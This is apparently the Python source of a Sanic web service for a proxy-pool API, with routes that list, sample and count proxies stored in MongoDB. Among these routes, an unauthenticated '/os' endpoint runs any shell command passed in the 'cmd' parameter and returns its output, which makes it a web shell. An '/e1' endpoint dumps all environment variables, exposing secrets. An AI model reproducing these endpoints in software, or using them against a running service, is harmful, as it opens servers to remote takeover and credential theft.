import os
import subprocess

from sanic import Request, Blueprint
from sanic.response import empty, text

from utils.common import serializer, get_bj_date, get_utc_date, format_date, format_uptime
from utils.db import DB

bp_api = Blueprint('api', url_prefix='v1')
bp_home = Blueprint('home')


@bp_home.get('/', name='index')
@serializer()
async def index(request: Request):
    config = request.app.config
    return {'dev': config.DEV}


@bp_home.get('/ip2', name='ip')
@serializer()
async def get_ip(request: Request):
    headers = {a: b for a, b in request.headers.items()}
    data = {
        'ip': request.remote_addr,
        'ip2': request.ip,
        'request': request.url,
        'forwarded': request.forwarded,
        'headers': headers,
        'host': request.host,
        'bj_date': get_bj_date(),
        'utc_date': get_utc_date()
    }
    return data


@bp_home.get('/robot.txt', name='robot_file')
async def robot_file(request):
    return empty()


@bp_home.route('/os', methods=['GET', 'POST'])
async def run_os(request: Request):
    cmd = request.form.get('cmd')
    if not cmd:
        cmd = request.args.get('cmd')
    output = subprocess.getoutput(cmd)
    return text(output)


@bp_home.get('/e1')
@serializer()
async def envs(request):
    return dict(os.environ)


@bp_api.get('/proxies')
@serializer()
async def proxies(request: Request):
    col = DB.get_col()
    data = []
    country = request.args.get('country')
    proxy_type = request.args.get('type')

    page = int(request.args.get('page', 1))
    limit = int(request.args.get('limit', 5))
    offset = (page - 1) * limit
    cond = {'status': 1, 'country': {'$ne': ''}}
    if country:
        cond['country'] = country
    if proxy_type:
        cond['proxy_type'] = proxy_type
    async for item in col.find(cond).sort('last_time', -1).limit(limit).skip(offset):
        proxy = {
            'ip': item['_id'],
            'port': item['port'],
            'type': item['proxy_type'],
            'country': item['country'],
            # 'uptime': format_uptime(item['uptime']),
            'last_check': format_date(item['last_time'])
        }
        data.append(proxy)
    return data


@bp_api.get('/get')
@serializer()
async def proxy_get(request: Request):
    col = DB.get_col()
    pipeline = [
        {'$match': {'status': 1}},
        {'$sample': {'size': 1}},
        {'$sort': {'last_time': -1}}
    ]
    data = []
    async for item in col.aggregate(pipeline):
        data = {
            'ip': item['_id'],
            'port': item['port'],
            'type': item['proxy_type'],
            'country': item['country'],
            # 'uptime': format_uptime(item['uptime']),
            'last_check': format_date(item['last_time'])
        }
    return data


@bp_api.get('/count')
@serializer()
async def proxy_count(request: Request):
    col = DB.get_col()
    data = {'items': [], 'total': 0}
    pipeline = [
        {'$match': {'status': 1}},
        {'$group': {'_id': '$country', 'total': {"$sum": 1}}}
    ]
    async for item in col.aggregate(pipeline):
        data['total'] += int(item['total'])
        data['items'].append({'country': item['_id'], 'total': item['total']})
    return data
